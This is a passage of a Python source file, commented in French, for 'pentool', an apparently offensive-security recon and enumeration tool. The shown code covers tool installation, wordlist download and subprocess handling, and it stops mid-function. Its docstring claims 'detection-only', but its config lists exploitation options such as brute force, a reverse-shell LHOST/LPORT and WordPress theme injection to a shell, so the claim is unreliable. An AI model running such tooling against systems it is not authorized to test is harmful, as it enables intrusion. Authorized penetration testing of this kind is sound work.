#!/usr/bin/env python3
"""
pentool v0.64 — Recon/Enum automation (detection-only)

- Recon / Enum uniquement (PAS d'exploitation).
- Mode CLI + Mode WebUI local.
- Si --ui n'est pas fourni : le script demande au démarrage (web ou cli).

Nouveautés v0.62 (preset "pro-fast") :
- Preset performance par défaut en scan-mode quick (désactive nmap --script vuln, active searchsploit).
- Web enum "early" : démarrage progressif de l'énum web pendant que Nmap tourne (ports discovery),
  avec garde-fous (max URLs simultanées, max gobuster simultané, threads gobuster réduits).

Correctifs v0.62 :
- Rich: évite "Only one live display may be active at once" en désactivant console.status() dans les threads.
- print_summary(): corrige NameError cfg.

Correctifs v0.64 :
- VERSION 0.64 — reporting embedé (résultats inline dans le HTML).
- Reporting v0.64 : résultats scans directement dans le rapport HTML.

Correctifs v0.64.1 (portabilité — résultats reproductibles entre machines) :
- Environnement d'exécution figé pour TOUTES les commandes (base_env / run_cmd) :
  locale C.UTF-8, couleurs désactivées (TERM=dumb, NO_COLOR), PYTHONIOENCODING=utf-8.
  → corrige les comptages/regex qui variaient selon la locale (fr/de) de la machine.
- Nettoyage systématique des codes couleur ANSI avant parsing (strip_ansi).
- Searchsploit : comptage des hits fiable (vraie ligne de résultat vs bordures/titres).
- Nmap vuln : comptage des vulnérabilités CONFIRMÉES (exclut "NOT/LIKELY VULNERABLE").
- enum4linux-ng : détection de session nulle robuste (JSON multi-clés + repli texte),
  fin du comptage "share" gonflé.
- parse_nmap_xml : champs service None-safe, portid invalide ignoré proprement.
- Sonde web HTTP/HTTPS : timeout 1.2s → 4.0s, configurable via --probe-timeout
  (cible distante/VPN), lecture de réponse tolérante au fractionnement TCP.

Correctifs v0.65 :
- Preset "pro-fast" RÉELLEMENT rapide : il tune désormais les paramètres coûteux
  (wordlist courte ~common.txt, sévérité nuclei high,critical, ffuf -t 20,
  timeout web long 900s) au lieu de seulement basculer des outils on/off.
  L'utilisateur garde le dernier mot : tout flag explicite (--wordlist,
  --nuclei-severity, --ffuf-threads, --web-timeout-long) écrase le preset.
- Nettoyage des sous-processus : chaque outil tourne dans sa propre session et
  un gestionnaire (Ctrl-C / SIGTERM / fin de programme) tue tout le groupe.
  → fini les ffuf/nmap/nuclei orphelins qui survivaient à un Ctrl-C.
- Au timeout, on tue le GROUPE de processus (pas seulement le parent).
- Affichage : les labels d'étape (ex. "[nmap ports]") ne sont plus avalés par
  l'interprétation markup de Rich.
- Feedback anti-silence : "… <étape> toujours en cours (Xs)" toutes les 30s
  pour les outils web longs lancés en thread (ffuf, nikto…).
- Le résumé de config affiche la sévérité nuclei et les threads ffuf choisis.
"""

from __future__ import annotations

import argparse
import atexit
import datetime as dt
import json
import os
import queue
import re
import shutil
import signal
import socket
import ssl
import subprocess
import sys
import time
import threading
import traceback
import xml.etree.ElementTree as ET
from dataclasses import dataclass, asdict
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed, Future
from typing import Dict, List, Optional, Tuple, Callable

# -------------------- Reporting module --------------------
try:
    from reporting import generate_reports as _generate_reports_ext
    REPORTING_EXT = True
except ImportError:
    REPORTING_EXT = False

# -------------------- Rich UI --------------------
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt, Confirm
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    from rich import box

    console = Console()
    RICH = True
except Exception:
    console = None
    RICH = False

APP_NAME = "pentool"
VERSION = "0.68"

ASCII = r"""
 ██████╗ ███████╗███╗   ██╗████████╗ ██████╗  ██████╗ ██╗
 ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔═══██╗██╔═══██╗██║
 ██████╔╝█████╗  ██╔██╗ ██║   ██║   ██║   ██║██║   ██║██║
 ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██║   ██║██║   ██║██║
 ██║     ███████╗██║ ╚████║   ██║   ╚██████╔╝╚██████╔╝███████╗
 ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
"""

DEFAULT_TOP_PORTS = 1000

# ── Wordlists par ordre de préférence (la première existante est utilisée) ──
# SecLists est ~10-50x plus efficace que dirb/common pour le fuzzing web.
WORDLIST_PRIORITY = [
    # SecLists installes via : sudo apt install seclists
    Path("/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"),
    Path("/usr/share/seclists/Discovery/Web-Content/common.txt"),
    Path("/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"),
    Path("/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt"),
    # Fallback : wordlists classiques Kali
    Path("/usr/share/wordlists/dirb/common.txt"),
    Path("/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"),
]

# URL de telechargement direct si SecLists absent
SECLISTS_DOWNLOAD = {
    "raft-medium-directories.txt": (
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master"
        "/Discovery/Web-Content/raft-medium-directories.txt"
    ),
    "common.txt": (
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master"
        "/Discovery/Web-Content/common.txt"
    ),
}

# Dossier local de stockage si SecLists n'est pas installe systeme
SECLISTS_LOCAL_DIR = Path.home() / ".pentool" / "wordlists"


def resolve_wordlist() -> Path:
    """Retourne la meilleure wordlist disponible (SecLists > local > dirb)."""
    # Cherche dans le dossier local ~/.pentool/wordlists/
    if SECLISTS_LOCAL_DIR.exists():
        for p in WORDLIST_PRIORITY[:4]:
            local = SECLISTS_LOCAL_DIR / p.name
            if local.exists() and local.stat().st_size > 1000:
                return local
    # Cherche dans les chemins systeme
    for p in WORDLIST_PRIORITY:
        if p.exists() and p.stat().st_size > 1000:
            return p
    # Rien : retourne dirb comme fallback (sera detecte absent)
    return WORDLIST_PRIORITY[-2]


DEFAULT_WORDLIST = resolve_wordlist()

# Correctif v0.65 — Le preset "pro-fast" doit être réellement RAPIDE. La phase
# la plus longue est le fuzzing web : raft-medium fait ~30k entrées. En pro-fast
# on privilégie donc une liste courte mais utile (common.txt ~4,7k, ou raft-small
# ~20k en repli). L'utilisateur garde le dernier mot via --wordlist.
FAST_WORDLIST_PRIORITY = [
    Path("/usr/share/seclists/Discovery/Web-Content/common.txt"),
    Path("/usr/share/wordlists/dirb/common.txt"),
    Path("/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt"),
    Path("/usr/share/wordlists/dirb/big.txt"),
]

def resolve_wordlist_fast() -> Path:
    """Meilleure wordlist COURTE disponible (pour le preset pro-fast)."""
    if SECLISTS_LOCAL_DIR.exists():
        for p in FAST_WORDLIST_PRIORITY:
            local = SECLISTS_LOCAL_DIR / p.name
            if local.exists() and local.stat().st_size > 1000:
                return local
    for p in FAST_WORDLIST_PRIORITY:
        if p.exists() and p.stat().st_size > 1000:
            return p
    return DEFAULT_WORDLIST   # repli : la liste standard

COMMON_WEB_PORTS = {
    80, 81, 3000, 5000, 5601, 7001, 8000, 8008, 8080, 8081, 8088, 8443, 8888, 9000, 9200, 9443, 10443, 15672
}

# Ports qui ne sont JAMAIS des services web (évite les faux positifs HTTP)
NON_WEB_PORTS = {21, 22, 23, 25, 53, 110, 111, 139, 143, 389, 445, 636, 993, 995, 3306, 5432, 1433, 27017}

SMB_PORTS = {139, 445}
SMB_SERVICE_NAMES = {"microsoft-ds", "netbios-ssn", "smb"}

# -------------------- UTIL --------------------
def eprint(msg: str) -> None:
    print(f"[!] {msg}", file=sys.stderr)

# Correctif v0.65 : Rich interprète les crochets comme des balises de style.
# Les messages contenant "[nmap ports]" voyaient donc leur label avalé à
# l'affichage. On échappe les crochets du texte applicatif (aucun appelant ne
# passe de markup volontaire à ces helpers).
def _rs(msg: str) -> str:
    return msg.replace("[", r"\[") if RICH else msg

def info(msg: str) -> None:
    if RICH:
        console.print(f"[cyan]{_rs(msg)}[/cyan]")
    else:
        print(msg)
    sys.stdout.flush()

def ok(msg: str) -> None:
    if RICH:
        console.print(f"[green]{_rs(msg)}[/green]")
    else:
        print(msg)
    sys.stdout.flush()

def warn(msg: str) -> None:
    if RICH:
        console.print(f"[yellow]{_rs(msg)}[/yellow]")
    else:
        print(msg)
    sys.stdout.flush()

def bad(msg: str) -> None:
    if RICH:
        console.print(f"[red]{_rs(msg)}[/red]")
    else:
        print(msg)
    sys.stdout.flush()

def which(bin_name: str) -> bool:
    return shutil.which(bin_name) is not None

def safe_name(s: str) -> str:
    return re.sub(r"[^a-zA-Z0-9_.-]", "_", s)

def truncate(s: str, n: int = 110) -> str:
    s = (s or "").replace("\t", " ").strip()
    return s if len(s) <= n else s[: n - 1] + "…"

def now_iso() -> str:
    return dt.datetime.now().isoformat(timespec="seconds")

def _elapsed(start: float) -> float:
    return max(0.0, time.time() - start)

def _is_root() -> bool:
    try:
        return os.geteuid() == 0
    except Exception:
        return False

# ──────────────────────────────────────────────────────────────────────────
# Correctif v0.64.1 — Portabilité / résultats reproductibles d'une machine à
# l'autre. Beaucoup d'outils (nmap NSE, searchsploit, enum4linux-ng, nuclei…)
# adaptent leur sortie à la LOCALE et au TERMINAL. Sur une machine en locale
# fr_FR/de_DE, ou avec couleurs forcées, les chaînes parsées ("VULNERABLE",
# "username:", séparateurs de tableau) changent → comptages et findings faux.
# On fige donc un environnement neutre pour TOUTES les commandes lancées.
# ──────────────────────────────────────────────────────────────────────────
_ANSI_RE = re.compile(r"\x1b\[[0-9;?]*[ -/]*[@-~]")

def strip_ansi(text: str) -> str:
    """Retire les séquences d'échappement ANSI (couleurs) d'une sortie outil."""
    return _ANSI_RE.sub("", text or "")

def base_env(extra: Optional[dict] = None) -> dict:
    """
    Environnement d'exécution neutre et reproductible :
    - LANG / LC_ALL = C.UTF-8 : sortie outils en anglais + UTF-8 (regex stables).
    - LANGUAGE vidé : évite qu'une préférence de langue ré-écrase LC_ALL.
    - TERM=dumb + NO_COLOR=1 + CLICOLOR=0 : coupe les couleurs à la source
      (NO_COLOR est honoré par nuclei, ffuf, gobuster et la plupart des outils Go).
    - PYTHONIOENCODING=utf-8 : décodage cohérent des sous-process Python.
    `extra` permet d'ajouter/écraser des variables spécifiques (ex: searchsploit).
    """
    env = os.environ.copy()
    env["LANG"] = "C.UTF-8"
    env["LC_ALL"] = "C.UTF-8"
    env["LANGUAGE"] = ""
    env["TERM"] = "dumb"
    env["NO_COLOR"] = "1"
    env["CLICOLOR"] = "0"
    env["PYTHONIOENCODING"] = "utf-8"
    if extra:
        env.update(extra)
    return env

# ──────────────────────────────────────────────────────────────────────────
# Correctif v0.65 — Nettoyage des sous-processus (orphelins type ffuf/nmap).
# Avant : un Ctrl-C tuait pentool mais PAS les outils qu'il avait lancés ; ffuf
# continuait à tourner en orphelin et à taper la cible. On lance désormais chaque
# outil dans sa PROPRE session (start_new_session=True) et on garde un registre
# pour tuer tout le groupe à l'arrêt (signal, exception, ou fin normale).
# ──────────────────────────────────────────────────────────────────────────
_CHILD_PROCS: set = set()
_CHILD_LOCK = threading.Lock()

def _register_proc(p) -> None:
    with _CHILD_LOCK:
        _CHILD_PROCS.add(p)

def _unregister_proc(p) -> None:
    with _CHILD_LOCK:
        _CHILD_PROCS.discard(p)

def _kill_group(p, sig) -> None:
    """Tue le groupe de processus de p (donc l'outil ET ses éventuels enfants)."""
    try:
        os.killpg(os.getpgid(p.pid), sig)
    except Exception:
        try:
            p.send_signal(sig)
        except Exception:
            pass

def _terminate_all_children() -> None:
    with _CHILD_LOCK:
        procs = [p for p in _CHILD_PROCS if p.poll() is None]
    if not procs:
        return
    for p in procs:                       # 1) demande polie
        _kill_group(p, signal.SIGTERM)
    deadline = time.time() + 1.5          # 2) laisse 1,5 s pour mourir
    while time.time() < deadline and any(p.poll() is None for p in procs):
        time.sleep(0.05)
    for p in procs:                       # 3) on insiste
        if p.poll() is None:
            _kill_group(p, signal.SIGKILL)

_CLEANUP_INSTALLED = False
def install_cleanup_handlers() -> None:
    """À appeler une fois depuis le thread principal (main)."""
    global _CLEANUP_INSTALLED
    if _CLEANUP_INSTALLED:
        return
    _CLEANUP_INSTALLED = True
    atexit.register(_terminate_all_children)

    def _handler(signum, frame):
        bad(f"\n[!] Interruption (signal {signum}) — arrêt des outils en cours…")
        _terminate_all_children()
        raise SystemExit(130)

    for s in (signal.SIGINT, signal.SIGTERM):
        try:
            signal.signal(s, _handler)
        except Exception:
            pass

def _signal_stage(logs_dir: Path, stage: str) -> None:
    """Écrit le stage courant dans _current_stage.txt pour le WebUI (badge jaune)."""
    try:
        (logs_dir / "_current_stage.txt").write_text(stage, encoding="utf-8")
    except Exception:
        pass

def _clear_stage(logs_dir: Path) -> None:
    """Efface le stage courant (fin du scan)."""
    try:
        (logs_dir / "_current_stage.txt").write_text("", encoding="utf-8")
    except Exception:
        pass

def _run_safe(label: str, fn, *args, default=None, **kwargs):
    """
    Appelle fn(*args, **kwargs) et intercepte toute exception inattendue.
    Affiche le traceback complet sur stdout → visible dans le logs tail WebUI.
    Retourne `default` en cas d'erreur (None par défaut).
    """
    try:
        return fn(*args, **kwargs)
    except Exception as exc:
        sep = "=" * 60
        bad(f"\n{sep}")
        bad(f"[!] ERREUR MODULE [{label}]  {type(exc).__name__}: {exc}")
        bad(traceback.format_exc().rstrip())
        bad(f"{sep}\n")
        return default

def run_cmd(
    cmd: List[str],
    capture_file: Path,
    timeout: Optional[int] = None,
    label: str = "cmd",
    verbose: bool = False,
    env: Optional[dict] = None,
    on_line: Optional[Callable[[str], None]] = None,
) -> int:
    """
    Exécute une commande et capture stdout/stderr dans capture_file.
    Affiche un statut Rich pendant l'exécution (évite le “vide”).

    Important (correctif) :
    - Rich Live (console.status) ne supporte pas le multi-thread.
      Donc si run_cmd est appelé depuis un worker thread, on désactive console.status().

    Correctif v0.64.1 : si aucun env n'est fourni, on impose base_env() (locale C.UTF-8,
    couleurs coupées) pour que la sortie capturée soit identique sur toutes les machines.
    """
    if env is None:
        env = base_env()
    capture_file.parent.mkdir(parents=True, exist_ok=True)
    header = f"$ {' '.join(cmd)}\n# started: {now_iso()}\n\n"
    start = time.time()

    # ✅ Correctif Rich multi-thread
    in_main_thread = (threading.current_thread() is threading.main_thread())

    def done_msg(rc: int) -> None:
        elapsed = _elapsed(start)
        if rc == 0:
            ok(f"OK  [{label}] ({elapsed:.1f}s) -> {capture_file}")
        elif rc == 124:
            warn(f"TIMEOUT [{label}] ({elapsed:.1f}s) -> {capture_file}")
        else:
            bad(f"FAIL [{label}] (rc={rc}, {elapsed:.1f}s) -> {capture_file}")

    if not RICH:
        with capture_file.open("w", encoding="utf-8", errors="replace") as f:
            f.write(header)
            try:
                p = subprocess.run(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    timeout=timeout,
                    text=True,
                    errors="replace",
                    env=env,
                    start_new_session=True,   # v0.65 : enfant dans sa propre session
                )
                out = p.stdout or ""
                f.write(out)
                if on_line:
                    for line in out.splitlines(True):
                        try:
                            on_line(line)
                        except Exception:
                            pass
                f.write(f"\n# finished: {now_iso()}\n")
                done_msg(p.returncode)
                return p.returncode
            except subprocess.TimeoutExpired:
                f.write("\n[!] TIMEOUT\n")
                f.write(f"\n# finished: {now_iso()}\n")
                done_msg(124)
                return 124
            except Exception as ex:
                f.write(f"\n[!] ERROR: {ex}\n")
                f.write(f"\n# finished: {now_iso()}\n")
                done_msg(1)
                return 1

    last_line = ""
    with capture_file.open("w", encoding="utf-8", errors="replace") as f:
        f.write(header)
        f.flush()

        status_text = f"[bold]{label}[/bold]…"

        # ✅ Worker thread: PAS de console.status()
        if not in_main_thread:
            p = None
            try:
                p = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                    universal_newlines=True,
                    errors="replace",
                    env=env,
                    start_new_session=True,   # v0.65 : groupe tuable proprement
                )
                _register_proc(p)             # v0.65 : suivi pour nettoyage à l'arrêt

                next_beat = start + 30.0      # v0.65 : battement anti-silence (30s)
                while True:
                    if timeout is not None and _elapsed(start) > timeout:
                        _kill_group(p, signal.SIGKILL)   # tue le groupe, pas que ffuf
                        f.write("\n[!] TIMEOUT\n")
                        f.write(f"\n# finished: {now_iso()}\n")
                        done_msg(124)
                        return 124

                    line = p.stdout.readline() if p.stdout else ""
                    if line:
                        f.write(line)
                        if on_line:
                            try:
                                on_line(line)
                            except Exception:
                                pass
                    else:
                        if p.poll() is not None:
                            break
                        # v0.65 : signe de vie périodique (outils web longs, ex. ffuf)
                        if time.time() >= next_beat:
                            info(f"… {label} toujours en cours ({_elapsed(start):.0f}s)")
                            next_beat = time.time() + 30.0
                        time.sleep(0.05)

                rc = p.returncode if p.returncode is not None else 0
                f.write(f"\n# finished: {now_iso()}\n")
                done_msg(rc)
                return rc

            except Exception as ex:
                if p is not None:
                    _kill_group(p, signal.SIGKILL)
                f.write(f"\n[!] ERROR: {ex}\n")
                f.write(f"\n# finished: {now_iso()}\n")
                done_msg(1)
                return 1
            finally:
                if p is not None:
                    _unregister_proc(p)

        # Thread principal: Rich status OK
        with console.status(status_text, spinner="dots") as st:
            p = None
            try:
                p = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                    universal_newlines=True,
                    errors="replace",
                    env=env,
                    start_new_session=True,   # v0.65 : groupe tuable proprement
                )
                _register_proc(p)             # v0.65 : suivi pour nettoyage à l'arrêt

                while True:
                    if timeout is not None and _elapsed(start) > timeout:
                        _kill_group(p, signal.SIGKILL)
                        f.write("\n[!] TIMEOUT\n")
                        f.write(f"\n# finished: {now_iso()}\n")
                        done_msg(124)
                        return 124

                    line = p.stdout.readline() if p.stdout else ""
                    if line:
                        f.write(line)
                        if on_line:
                            try:
                                on_line(line)
                            except Exception:
                                pass
                        if verbose:
                            last_line = truncate(line)
                            st.update(f"{status_text} [dim]{last_line}[/dim]")
                    else:
                        if p.poll() is not None:
                            break
                        time.sleep(0.05)

                rc = p.returncode if p.returncode is not None else 0
                f.write(f"\n# finished: {now_iso()}\n")
                done_msg(rc)
                return rc

            except Exception as ex:
                if p is not None:
                    _kill_group(p, signal.SIGKILL)
                f.write(f"\n[!] ERROR: {ex}\n")
                f.write(f"\n# finished: {now_iso()}\n")
                done_msg(1)
                return 1
            finally:
                if p is not None:
                    _unregister_proc(p)

# -------------------- CONFIG --------------------
@dataclass
class Config:
    ui: str
    web_host: str
    web_port: int
    no_browser: bool

    target: str
    workspace: Path
    run_id: str
    authorized: bool

    scan_mode: str
    staged_nmap: bool
    pn: bool
    no_dns: bool

    min_rate: int
    max_retries: int
    host_timeout: str
    stats_every: str

    enum_default_scripts: bool
    version_light: bool

    no_web: bool
    no_vuln: bool
    vuln_mode: str
    run_searchsploit: bool
    run_nuclei: bool
    run_enum4linux: bool
    use_ffuf: bool
    no_nikto: bool
    run_sqlmap: bool          # SQLi automatique sur URLs découvertes
    run_web_crawl: bool       # Crawl web pour trouver paramètres/formulaires
    run_xss: bool             # Détection XSS sur formulaires et paramètres
    web_auth: Optional[str]   # Credentials pour login web (format user:pass)
    web_auth_url: Optional[str]  # URL de login (auto-détectée si None)

    nuclei_severity: str
    nuclei_timeout: int
    ffuf_threads: int

    preset: str
    web_early: bool
    max_web_urls: int
    max_gobuster: int
    gobuster_threads: int

    threads: int
    wordlist: Path
    verbose: bool

    nmap_timeout: int
    enum_timeout: int
    vuln_timeout: int
    web_timeout_short: int
    web_timeout_long: int

    extra_nmap_args: List[str]

    # Correctif v0.64.1 : timeout (s) des sondes HTTP/HTTPS de détection web.
    # Champ avec valeur par défaut → n'impacte pas le constructeur existant.
    probe_timeout: float = 4.0

    # ── Exploitation (v0.66) ──
    run_exploit: bool = False
    exploit_brute: bool = False
    brute_userlist: Optional[Path] = None
    brute_passlist: Optional[Path] = None

    # ── Credential hints (v0.69) ──
    # L'utilisateur peut fournir un username et/ou un password comme point de départ.
    # Ces hints sont utilisés en priorité dans tous les modules d'authentification
    # (brute force, connexion FTP/SSH, WP login…) avant les wordlists génériques.
    hint_username: Optional[str] = None
    hint_password: Optional[str] = None

    # ── Post-exploitation / Initial Access (v0.67) ──
    lhost: Optional[str] = None      # IP attaquant pour reverse shell (tun0/VPN)
    lport: int = 4444                # Port listener reverse shell
    run_postexploit: bool = True     # Post-exploit auto (désactivable --no-postexploit)

    # ── Découverte avancée (v0.68) ──
    run_robots: bool = True          # robots.txt + sitemap.xml
    run_js_scrape: bool = True       # Scrape JS files (API keys, endpoints)
    run_git_check: bool = True       # Détecte .git exposé
    run_archive_crack: bool = False  # Crack archives protégées (john) — opt-in
    run_wp_brute: bool = False       # WordPress brute force — opt-in
    run_wp_aggressive: bool = False  # WPScan mode agressif (plugins exhaustif) — opt-in
    run_wp_exploit: bool = False     # WP Theme Injection → reverse shell (post-exploitation)

# -------------------- PRE-CHECKS + AUTO-INSTALL --------------------
TOOLS = {
    "nmap": "Scan réseau + scripts NSE",
    "whatweb": "Fingerprinting web",
    "nikto": "Web checks (legacy, verbose)",
    "gobuster": "Bruteforce répertoires",
    "ffuf": "Fuzzing web avancé (dirs + vhosts)",
    "searchsploit": "Mapping Exploit-DB (références)",
    "nuclei": "Vuln scanner moderne (templates communautaires)",
    "enum4linux-ng": "Énumération SMB/NetBIOS (shares, users, policies)",
}

# Commandes d'installation pour chaque outil (Kali/Debian)
INSTALL_MAP: Dict[str, Dict[str, str]] = {
    "nmap":           {"apt": "sudo apt install -y nmap"},
    "whatweb":        {"apt": "sudo apt install -y whatweb"},
    "nikto":          {"apt": "sudo apt install -y nikto"},
    "gobuster":       {"apt": "sudo apt install -y gobuster"},
    "ffuf":           {"apt": "sudo apt install -y ffuf", "go": "go install github.com/ffuf/ffuf/v2@latest"},
    "searchsploit":   {"apt": "sudo apt install -y exploitdb"},
    "nuclei":         {"go": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest", "note": "Puis: nuclei -update-templates"},
    "enum4linux-ng":  {"pip": "pip install enum4linux-ng --break-system-packages", "apt": "sudo apt install -y enum4linux-ng"},
}


def _try_install(tool: str) -> bool:
    """
    Tente d'installer un outil automatiquement.
    Retourne True si l'installation a réussi.
    """
    cmds = INSTALL_MAP.get(tool, {})
    if not cmds:
        return False

    # Priorité : apt > pip > go
    for method in ("apt", "pip", "go"):
        cmd_str = cmds.get(method)
        if not cmd_str:
            continue

        info(f"Installation de {tool} via {method}...")
        try:
            rc = subprocess.run(
                cmd_str, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                timeout=120, text=True,
            )
            if rc.returncode == 0 and which(tool):
                ok(f"{tool} installé avec succès !")
                # Post-install (ex: nuclei templates)
                note = cmds.get("note")
                if note:
                    info(f"  → {note}")
                    if "nuclei" in tool:
                        subprocess.run(
                            "nuclei -update-templates", shell=True,
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            timeout=120, text=True,
                        )
                return True
            else:
                warn(f"Échec de l'installation de {tool} via {method}.")
        except Exception as ex:
            warn(f"Erreur pendant l'installation de {tool}: {ex}")

    return False


def _show_install_cmd(tool: str) -> str:
    """Retourne la commande d'installation recommandée pour un outil."""
    cmds = INSTALL_MAP.get(tool, {})
    parts = []
    for method in ("apt", "pip", "go"):
        if method in cmds:
            parts.append(cmds[method])
    return " | ou | ".join(parts) if parts else "(pas de commande connue)"


def setup_wordlists(cfg: Config) -> None:
    """
    Vérifie la wordlist configurée.
    Si absente ou trop petite (dirb ~4600 mots), propose :
      1. Installer SecLists via apt (recommandé, ~500 Mo, toutes les listes)
      2. Télécharger uniquement raft-medium-directories.txt via wget (~17 000 mots)
      3. Continuer avec la liste existante (ou sans liste)
    Met à jour cfg.wordlist avec la meilleure liste disponible.

    Note : si l'utilisateur a passé --wordlist explicitement (différent du défaut),
    on respecte son choix sans tenter de l'écraser.
    """
    # Respecte --wordlist custom : si différent du défaut auto-résolu, on ne touche pas
    user_override = (cfg.wordlist != DEFAULT_WORDLIST and cfg.wordlist.exists())
    if user_override:
        size_kb = cfg.wordlist.stat().st_size // 1024
        ok(f"Wordlist custom : {cfg.wordlist} ({size_kb} Ko)")
        return

    # Re-résolution après installation éventuelle d'outils
    best = resolve_wordlist()
    if best.exists() and best.stat().st_size > 10_000:
        # SecLists ou une bonne liste est déjà disponible
        if best != cfg.wordlist:
            cfg.wordlist = best
            ok(f"Wordlist sélectionnée : {best} ({best.stat().st_size // 1024} Ko)")
        else:
            ok(f"Wordlist : {best} ({best.stat().st_size // 1024} Ko)")
        return

    # Wordlist absente ou trop petite
    is_small = best.exists() and best.stat().st_size < 50_000
    if is_small:
        warn(f"Wordlist trop petite : {best} ({best.stat().st_size // 1024} Ko) — dirb/common.txt n'est pas adapté à ffuf")
    else:
        warn("Aucune wordlist SecLists trouvée — le fuzzing web sera limité")

    if not sys.stdin.isatty():
        # Mode non-interactif : on garde ce qu'on a
        return

    if RICH:
        console.print("")
        console.print("[bold cyan]SecLists[/bold cyan] est la wordlist de référence pour le fuzzing web.")
        console.print("  [green]1[/green] — Installer SecLists complet   [dim](sudo apt install seclists, ~500 Mo)[/dim]")
        console.print("  [green]2[/green] — Télécharger raft-medium seul  [dim](wget, ~600 Ko, recommandé rapide)[/dim]")
        console.print("  [green]3[/green] — Continuer sans (fuzzing limité)")
        console.print("")
        choice = Prompt.ask("Choix", choices=["1", "2", "3"], default="2")
    else:
        print("SecLists non trouvé. Options :")
        print("  1 — sudo apt install seclists (~500 Mo)")
        print("  2 — Télécharger raft-medium-directories.txt (~600 Ko)")
        print("  3 — Continuer sans")
        choice = input("Choix [1/2/3] (défaut: 2): ").strip() or "2"

    if choice == "1":
        info("Installation de SecLists via apt...")
        rc = subprocess.run(
            "sudo apt install -y seclists",
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            timeout=300, text=True,
        )
        if rc.returncode == 0:
            best = resolve_wordlist()
            if best.exists():
                cfg.wordlist = best
                ok(f"SecLists installé : {best}")
            else:
                warn("SecLists installé mais wordlist non trouvée, vérifier /usr/share/seclists/")
        else:
            bad("Échec de apt install seclists. Essaie manuellement.")

    elif choice == "2":
        _download_wordlist(cfg)

    else:
        info("Fuzzing web limité à la wordlist existante.")


def _download_wordlist(cfg: Config) -> None:
    """Télécharge raft-medium-directories.txt depuis GitHub via wget ou urllib."""
    SECLISTS_LOCAL_DIR.mkdir(parents=True, exist_ok=True)
    dest = SECLISTS_LOCAL_DIR / "raft-medium-directories.txt"
    url  = SECLISTS_DOWNLOAD["raft-medium-directories.txt"]

    info(f"Téléchargement : {url}")
    info(f"Destination    : {dest}")

    # Essai wget (plus rapide, barre de progression)
    if which("wget"):
        rc = subprocess.run(
            ["wget", "-q", "--show-progress", "-O", str(dest), url],
            timeout=120,
        )
        if rc.returncode == 0 and dest.exists() and dest.stat().st_size > 10_000:
            cfg.wordlist = dest
            ok(f"Wordlist téléchargée : {dest} ({dest.stat().st_size // 1024} Ko)")
            return
        warn("wget a échoué, essai urllib...")

    # Fallback urllib (stdlib Python)
    try:
        import urllib.request
        urllib.request.urlretrieve(url, dest)
        if dest.exists() and dest.stat().st_size > 10_000:
            cfg.wordlist = dest
            ok(f"Wordlist téléchargée : {dest} ({dest.stat().st_size // 1024} Ko)")
        else:
            bad("Téléchargement échoué (fichier vide ou erreur réseau).")
    except Exception as ex:
        bad(f"Impossible de télécharger la wordlist : {ex}")
        info("Tu peux la télécharger manuellement :")
        info(f"  wget -O ~/.pentool/wordlists/raft-medium-directories.txt {url}")


def prechecks(cfg: Config, show_table: bool = True) -> None:
    present, missing = [], []
    for t, desc in TOOLS.items():
        (present if which(t) else missing).append((t, desc))

    # ── Affichage tableau ──
    if show_table and RICH:
        table = Table(title="Pré-checks outils", box=box.SIMPLE)
        table.add_column("Outil", style="bold")
        table.add_column("Rôle")
        table.add_column("Statut")
        for t, desc in present:
            table.add_row(t, desc, "[green]✓ OK[/green]")
        for t, desc in missing:
            table.add_row(t, desc, "[yellow]✗ ABSENT[/yellow]")
        console.print(table)
    else:
        if present:
            ok("Outils présents: " + ", ".join(t for t, _ in present))
        if missing:
            warn("Outils absents: " + ", ".join(t for t, _ in missing))

    # ── Nmap obligatoire ──
    if not which("nmap"):
        bad("Nmap est obligatoire et manquant.")
        cmd = _show_install_cmd("nmap")
        info(f"Installe-le avec: {cmd}")
        if sys.stdin.isatty():
            do_install = Confirm.ask("Installer nmap maintenant ?", default=True) if RICH else input("Installer nmap ? [Y/n]: ").strip().lower() != "n"
            if do_install and _try_install("nmap"):
                ok("Nmap installé, on continue.")
            else:
                eprint("Nmap manquant. Arrêt.")
                sys.exit(1)
        else:
            eprint("Nmap manquant (non-interactif). Arrêt.")
            sys.exit(1)

    # ── Outils optionnels manquants : proposer l'installation ──
    if missing and sys.stdin.isatty():
        optional_missing = [(t, desc) for t, desc in missing if t != "nmap"]
        if optional_missing:
            info("")
            info(f"{len(optional_missing)} outil(s) optionnel(s) manquant(s).")

            if RICH:
                do_install = Confirm.ask("Veux-tu installer les outils manquants automatiquement ?", default=True)
            else:
                ans = input("Installer les outils manquants ? [Y/n]: ").strip().lower()
                do_install = ans != "n"

            if do_install:
                for t, desc in optional_missing:
                    _try_install(t)
            else:
                info("Commandes d'installation manuelles :")
                for t, desc in optional_missing:
                    cmd = _show_install_cmd(t)
                    if RICH:
                        console.print(f"  [bold]{t}[/bold]: [dim]{cmd}[/dim]")
                    else:
                        print(f"  {t}: {cmd}")
                info("Les outils absents seront automatiquement sautés pendant le scan.")
            info("")

    # ── Désactivation auto des outils absents ──
    if cfg.run_searchsploit and not which("searchsploit"):
        warn("Searchsploit activé mais absent -> désactivation.")
        cfg.run_searchsploit = False

    if cfg.run_nuclei and not which("nuclei"):
